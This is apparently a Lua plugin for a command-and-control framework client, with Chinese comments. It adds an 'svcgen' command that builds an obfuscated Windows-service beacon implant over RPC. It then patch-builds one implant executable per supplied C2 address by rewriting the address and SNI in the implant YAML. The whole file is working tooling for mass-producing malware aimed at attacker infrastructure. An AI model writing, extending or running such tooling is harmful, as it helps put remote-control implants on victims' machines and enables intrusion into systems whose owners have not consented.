-- svcgen: 一键生成 Windows 服务 implant 及多 IP 变体
-- build(docker) -> poll -> download -> 按 IP 列表 patch 构建(不重编译)
-- 前置: 服务端 templates 目录已部署带固定 obf_seed 的模板 exe

local rpc = require("rpc")

local function sleep(s)
    local t = os.clock() + s
    while os.clock() < t do end
end

local function read_file(path)
    local f, err = io.open(path, "rb")
    if not f then error("read failed: " .. path .. " " .. tostring(err)) end
    local data = f:read("*a")
    f:close()
    return data
end

-- protobuf []byte 字段在 Lua 里是 userdata, 分块直接写文件
local function write_bytes(path, b)
    local f, err = io.open(path, "wb")
    if not f then error("write failed: " .. path .. " " .. tostring(err)) end
    if type(b) == "string" then
        f:write(b)
    else
        local n = #b
        local i = 1
        while i <= n do
            local j = math.min(i + 255, n)
            local t = {}
            for k = i, j do t[#t+1] = string.char(b[k]) end
            f:write(table.concat(t))
            i = j + 1
        end
    end
    f:close()
end

local function artifact_status(ctx, name)
    local arts = rpc.ListArtifact(ctx, ProtobufMessage.New("clientpb.Empty", {}))
    local n = #arts.Artifacts
    for i = 1, n do
        local a = arts.Artifacts[i]
        if a.Name == name then return a.Status end
    end
    return "missing"
end

local function wait_artifact(ctx, name, timeout_s)
    local deadline = os.time() + timeout_s
    while true do
        local st = artifact_status(ctx, name)
        if st == "completed" then return end
        if st == "failure" or st == "missing" then
            error("artifact " .. name .. " status=" .. st)
        end
        if os.time() > deadline then
            error("artifact " .. name .. " timeout")
        end
        sleep(5)
    end
end

local function retarget_yaml(yaml_text, addr)
    local host = addr:match("^(.-):")
    local out = yaml_text:gsub("(%- address: )[^%s]+", "%1" .. addr)
    out = out:gsub("(sni: )[^%s]+", "%1" .. host)
    return out
end

local function run_svcgen(flag_yaml, flag_out, flag_ips)
    if flag_yaml == "" or flag_out == "" or flag_ips == "" then
        print("usage: svcgen --src <implant.yaml> --dst <dir> --addrs ip1:port,ip2:port")
        return
    end

    local ips = {}
    for ip in string.gmatch(flag_ips, "([^,]+)") do ips[#ips+1] = ip end

    local ctx = active():Context()
    local yaml_text = read_file(flag_yaml)

    -- 1. 全量构建 base exe
    local artifact = rpc.Build(ctx, ProtobufMessage.New("clientpb.BuildConfig", {
        BuildType = "beacon",
        Target = "x86_64-pc-windows-gnu",
        Source = "docker",
        MaleficConfig = yaml_text,
    }))
    print("[*] build started: " .. artifact.Name)
    wait_artifact(ctx, artifact.Name, 1200)
    print("[+] build completed: " .. artifact.Name)

    -- 2. 下载 base exe
    os.execute("mkdir -p " .. flag_out)
    local full = rpc.DownloadArtifact(ctx, ProtobufMessage.New("clientpb.Artifact", {
        Name = artifact.Name,
        Format = "",
    }))
    local base_exe = flag_out .. "/base.exe"
    write_bytes(base_exe, full.Bin)
    print("[+] base exe: " .. base_exe)

    -- 3. 逐 IP patch 构建(服务端模板, 秒级)
    for _, addr in ipairs(ips) do
        local variant_yaml = retarget_yaml(yaml_text, addr)
        local out_name = "svc_beacon_" .. addr:gsub("[:.]", "_") .. ".exe"
        local part = rpc.Build(ctx, ProtobufMessage.New("clientpb.BuildConfig", {
            BuildType = "beacon",
            Target = "x86_64-pc-windows-gnu",
            Source = "patch",
            MaleficConfig = variant_yaml,
        }))
        wait_artifact(ctx, part.Name, 120)
        local pfull = rpc.DownloadArtifact(ctx, ProtobufMessage.New("clientpb.Artifact", {
            Name = part.Name,
            Format = "",
        }))
        write_bytes(flag_out .. "/" .. out_name, pfull.Bin)
        print("[+] " .. addr .. " -> " .. flag_out .. "/" .. out_name)
    end

    print("[*] all done")
end

local cmd = command("svcgen", run_svcgen, "build windows-service beacon and patch IP variants", "")
cmd:Flags():String("src", "", "path to base implant.yaml (needs fixed obf_seed)")
cmd:Flags():String("dst", "", "output directory")
cmd:Flags():String("addrs", "", "comma-separated C2 addresses, e.g. 1.2.3.4:5001,5.6.7.8:5001")

help("svcgen", [[
Build a Windows-service beacon once, then patch out one exe per C2 address.

**Usage:**

```
svcgen --src /path/implant.yaml --dst /path/out --addrs 1.2.3.4:5001,5.6.7.8:5001
```

> Requires: an active session (only borrows its RPC context);
> server templates dir must contain a windows_service template exe
> built with a fixed obf_seed.
]])
